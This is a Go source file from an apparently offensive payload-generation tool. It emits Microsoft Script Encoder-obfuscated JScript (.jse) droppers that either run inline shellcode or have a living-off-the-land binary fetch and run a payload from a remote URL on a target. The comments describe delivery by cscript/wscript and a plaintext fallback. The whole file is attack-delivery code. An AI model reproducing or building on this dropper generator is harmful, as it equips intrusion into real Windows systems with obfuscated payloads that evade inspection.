// jse.go — emit an SCRENC-encoded script (.jse) run via `cscript //nologo
// payload.jse` (or `wscript payload.jse`). It is the encoded form of the same
// JScript body -f js emits, wrapped in the Microsoft Script Encoder format.
//
// The SCRENC encoder is the inverse of the field-proven scrdec.py decoder (see
// screnc.go), and a Go round-trip test proves internal correctness. Windows
// on-target execution is the final verification step: if a generated .jse does
// not run under cscript/wscript on the engagement target, fall back to -f js
// (plaintext JScript) — see README "Delivery formats > jse".
package delivery

type jseEmitter struct{}

func (jseEmitter) Name() string { return "jse" }
func (jseEmitter) Ext() string  { return "jse" }

func (jseEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("jse")
	}
	encoded, err := ScrencEncode([]byte(jsBody(cmd)))
	if err != nil {
		return nil, err
	}
	return []Artifact{writeFile("payload.jse", []byte(encoded))}, nil
}